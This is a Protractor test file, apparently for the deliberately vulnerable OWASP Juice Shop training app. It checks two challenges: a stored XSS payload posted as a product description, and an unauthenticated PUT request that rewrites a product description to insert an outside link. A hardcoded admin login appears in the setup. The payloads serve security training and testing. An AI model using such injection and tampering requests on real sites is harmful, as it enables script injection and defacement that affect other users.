'use strict';

describe('/rest', function () {

    describe('challenge "xss4"', function () {

        protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});

        it('should be possible to create a new product when logged in', function () {
            var EC = protractor.ExpectedConditions;

            browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/api/Products\', {name: \'XSS4\', description: \'<script>alert("XSS4")</script>\', price: 47.11});');

            browser.get('/#/search');
            browser.wait(EC.alertIsPresent(), 5000, "'XSS4' alert is not present");
            browser.switchTo().alert().then(
                function (alert) {
                    browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Products/12\', {description: \'alert disabled\'});');
                    expect(alert.getText()).toEqual('XSS4');
                    alert.accept();
                });

        });

        protractor.expect.challengeSolved({challenge: 'xss4'});

    });

    describe('challenge "changeProduct"', function () {

        it('should be possible to change product via PUT request without being logged in', function () {
            browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Products/9\', {description: \'<a href="http://kimminich.de" target="_blank">kimminich.de</a>\'});');
        });

        protractor.expect.challengeSolved({challenge: 'changeProduct'});

    });

});
